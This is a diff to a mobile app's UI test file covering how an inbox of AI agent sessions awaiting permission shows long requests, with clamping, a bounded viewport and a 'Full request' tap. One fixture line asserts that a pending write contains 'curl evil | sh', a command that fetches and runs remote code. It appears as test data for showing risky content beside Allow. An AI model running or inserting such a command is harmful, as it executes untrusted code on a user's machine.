@@ -32,6 +32,7 @@ import { randomUUID } from 'expo-crypto';
 
 import { dispatchVerityShortcut } from '../../lib/voiceShortcut';
 import { HomeInbox, InboxCard, RESUME_PROMPT, replyFor } from './HomeInbox';
+import { INBOX_LINE_CLAMP, INBOX_REQUEST_MAX_HEIGHT } from '../inbox/InboxFeed';
 
 const ZERO_USAGE = {
   inputTokens: 0,
@@ -453,6 +454,37 @@ it('keeps a write’s content in view next to Allow', async () => {
   expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
   expect(screen.queryByText('Full request')).toBeNull();
   expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
+  // Whole but bounded: a long file would otherwise stretch the card past the screen.
+  const viewport = StyleSheet.flatten(screen.getByTestId('inbox-request-viewport').props.style);
+  expect(viewport).toMatchObject({ maxHeight: INBOX_REQUEST_MAX_HEIGHT });
+});
+
+it('keeps a long message to a session short in the overview, whole one tap away', async () => {
+  // An agent's report to another session ran the full height of the work list.
+  const message = Array.from({ length: 40 }, (_, i) => `Finding ${String(i)}.`).join('\n');
+  await renderInbox([
+    session('messenger', {
+      status: 'awaiting_input',
+      permissionAwaitingInput: true,
+      pendingPermissions: ['t1'],
+      pendingPermissionRequests: [
+        {
+          toolUseId: 't1',
+          tool: 'verity_send_session_message',
+          riskClass: 'ask',
+          input: { targetSessionId: 'other', message },
+        },
+      ],
+    }),
+  ]);
+  await screen.findByRole('button', { name: 'Allow once' });
+  const line = screen.getByTestId('inbox-line-text');
+  expect(line.props.children).toBe(message);
+  expect(line.props.numberOfLines).toBe(INBOX_LINE_CLAMP);
+  // Clamped only because the complete input stays readable under it.
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
+  fireEvent.press(screen.getByText('Full request'));
+  expect(screen.getByTestId('inbox-request').props.children).toContain('Finding 39.');
 });
 
 it('keeps a session with a permission and a ready pull request in one card', async () => {
